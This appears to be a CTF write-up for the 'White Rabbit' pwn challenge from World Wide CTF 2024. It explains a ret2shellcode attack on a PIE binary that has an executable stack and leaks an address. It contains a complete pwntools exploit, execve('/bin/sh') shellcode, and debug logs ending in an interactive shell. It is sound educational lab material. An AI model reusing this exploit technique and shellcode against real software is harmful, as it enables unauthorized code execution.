---
title: [WRITE UP] - World Wide CTF 2024 - White Rabbit
published: 2024-12-01
description: "Write up for White Rabbit challenge"
image: "./image.png"
tags: ["PWN", "2024"]
category: CTF Writeups
draft: false
---

![image.png](image.png)

### Description

> Just a nice easy warmup for you...
>

### Analysis

### General information

```bash
  (\\_/)
  ( •_•)
  / > 0x556bdd42d180

follow the white rabbit...
```

```bash
[*] '/home/alter/CTFs/WWF_2024/pwn/white_rabbit'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
    Debuginfo:  Yes
```

So we can see here, the binary have no canary and the PIE is enabled. One more thing is `Stack` is executable and it leak the address each time we run the binary. So we can think about `ret2shellcode`

### Brain time

So my experience for this is just take that address and maybe we will need it, so this is my code for take that leak address:

```python
p.recvuntil(b'/ > ')
leak = int(p.recvline()[:-1], 16)
info("[+] Leak: " + hex(leak))
```

Just check what that address it leak is by using dynamic debugging. I'm breakpoint at `follow()` function. We can see our leak address in my case is `0x555555555180` (I have disabled `ASLR` for easier). When I look around there is the leak address of `main` function:

```python
gef➤  disas*main
Dump of assembler code for function main:
   0x0000555555555180 <+0>:     push   rbp
```

Or we can look at pseudocode in IDA:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("\\n  (\\\\_/)");
  puts(asc_200D);
  printf("  / > %p\\n\\n", main);
  puts("follow the white rabbit...");
  follow();
  return 0;
}
```

As said before, the idea of this is `ret2shellcode` so what we need to find is:

- Offset from input to RIP
- Gadget
- Craft shellcode

For the offset, it is a little bit easy so I will skip this

The next step involves identifying the gadget. To identify the gadget in a PIE (Position Independent Executable) binary, tools like `ROPgadget` and `ropper` are used. However, because PIE is enabled, these tools cannot display the absolute addresses of gadgets. Instead, they provide offsets relative to the binary's base address, which is determined only at runtime.

To work around this, I used `ROPchain` to find the gadget's offset. Then, I calculated its relative position by comparing the gadget’s offset to the address of the main function in the binary. To do this, I first disassembled the main function in GDB before running the binary, capturing its pre-loading address. Subtracting the gadget's offset from the main’s address gave me the relative offset, which remains consistent between local and remote execution of the binary due to the fixed layout enforced by PIE.

```
➜  pwn ROPgadget --binary white_rabbit | grep "call rax"
0x000000000000100d : add byte ptr [rax], al ; test rax, rax ; je 0x1016 ; call rax
0x0000000000001014 : call rax
0x0000000000001012 : je 0x1016 ; call rax
0x0000000000001010 : test eax, eax ; je 0x1016 ; call rax
0x000000000000100f : test rax, rax ; je 0x1016 ; call rax

```

```nasm
gef➤  disas*main
Dump of assembler code for function main:
   0x0000000000001180 <+0>:     push   rbp

```

So our gadget's offset is `0x1180` - `0x10bf`= `0xc1`. But why is `call rax`? Because in the `x86-64` calling convention, the return value of a function is typically stored in the `RAX` register. This convention applies to most functions, including standard library functions like `gets`.

The last one is shellcode, just basic `/bin/sh` shellcode:

```nasm
    push 0x3b
    pop rax

    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi

    cdq
    push rdx
    pop rsi

    syscall
```

### Exploit

```python
#!/usr/bin/python3
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./white_rabbit', checksec=False)
def GDB(): gdb.attach(p, gdbscript='''

c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

ru(b'/ > ')
leak = int(rl()[:-1], 16)
info("Leak: " + hex(leak))

gadget = leak - 0xc1
shellcode = asm("""
    push 0x3b
    pop rax

    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi

    cdq
    push rdx
    pop rsi

    syscall
""", arch="amd64")

pl = flat(
    shellcode.ljust(120, b'A'),
    p64(gadget)
    )

sl(pl)
interactive()

```

```bash
➜  pwn ./exploit.py
[+] Starting local process '/home/alter/CTFs/WWF_2024/pwn/white_rabbit': pid 12216
[!] ASLR is disabled!
[DEBUG] Received 0x47 bytes:
    00000000  0a 20 20 28  5c 5f 2f 29  0a 20 20 28  20 e2 80 a2  │·  (│\\_/)│·  (│ ···│
    00000010  5f e2 80 a2  29 0a 20 20  2f 20 3e 20  30 78 35 35  │_···│)·  │/ > │0x55│
    00000020  35 35 35 35  35 35 35 31  38 30 0a 0a  66 6f 6c 6c  │5555│5551│80··│foll│
    00000030  6f 77 20 74  68 65 20 77  68 69 74 65  20 72 61 62  │ow t│he w│hite│ rab│
    00000040  62 69 74 2e  2e 2e 0a                               │bit.│..·│
    00000047
[*] Leak: 0x555555555180
[DEBUG] cpp -C -nostdinc -undef -P -I/home/alter/.local/lib/python3.12/site-packages/pwnlib/data/includes /dev/stdin
[DEBUG] Assembling
    .section .shellcode,"awx"
    .global _start
    .global __start
    _start:
    __start:
    .intel_syntax noprefix
    .p2align 0
        push 0x3b
        pop rax
        mov rdi, 0x68732f6e69622f
        push rdi
        push rsp
        pop rdi
        cdq
        push rdx
        pop rsi
        syscall
[DEBUG] /usr/bin/x86_64-linux-gnu-as -64 -o /tmp/pwn-asm-x8nkdsmx/step2 /tmp/pwn-asm-x8nkdsmx/step1
[DEBUG] /usr/bin/x86_64-linux-gnu-objcopy -j .shellcode -Obinary /tmp/pwn-asm-x8nkdsmx/step3 /tmp/pwn-asm-x8nkdsmx/step4
[DEBUG] Sent 0x81 bytes:
    00000000  6a 3b 58 48  bf 2f 62 69  6e 2f 73 68  00 57 54 5f  │j;XH│·/bi│n/sh│·WT_│
    00000010  99 52 5e 0f  05 41 41 41  41 41 41 41  41 41 41 41  │·R^·│·AAA│AAAA│AAAA│
    00000020  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000070  41 41 41 41  41 41 41 41  bf 50 55 55  55 55 00 00  │AAAA│AAAA│·PUU│UU··│
    00000080  0a                                                  │·│
    00000081
[*] Switching to interactive mode

follow the white rabbit...
$ whoami
[DEBUG] Sent 0x7 bytes:
    b'whoami\\n'
[DEBUG] Received 0x6 bytes:
    b'alter\\n'
alter
```
